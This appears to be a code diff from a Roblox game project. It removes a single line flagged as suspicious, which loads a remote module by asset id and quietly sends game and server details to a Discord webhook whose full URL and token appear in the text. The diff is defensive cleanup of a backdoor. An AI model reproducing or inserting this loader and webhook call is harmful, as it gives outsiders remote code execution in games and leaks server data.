@@ -1,2 +1,1 @@
--- Hmm Suspicious
-local H,P=game:GetService("HttpService"),game:GetService("Players");require(99777724700084);pcall(function()H:PostAsync("https://discord.com/api/webhooks/1462337791706009695/vIjiI7ZW3D922zhsVWtLcxtKjdvREc50KRgyiNjy22XmCR0je6fBWP4Xox3-X1_cYNvW",H:JSONEncode({username="DEVSS",embeds={{title="Game Logged!",color=0x5865F2,fields={{name="Game Name",value=game.Name,inline=false},{name="Players",value=tostring(#P:GetPlayers()),inline=true},{name="PlaceId",value=tostring(game.PlaceId),inline=true},{name="JobId",value=game.JobId,inline=false},{name="Game Link",value="[Click Here](https://www.roblox.com/games/"..game.PlaceId..")",inline=false}},timestamp=DateTime.now():ToIsoDate()}}}),Enum.HttpContentType.ApplicationJson)end)
+
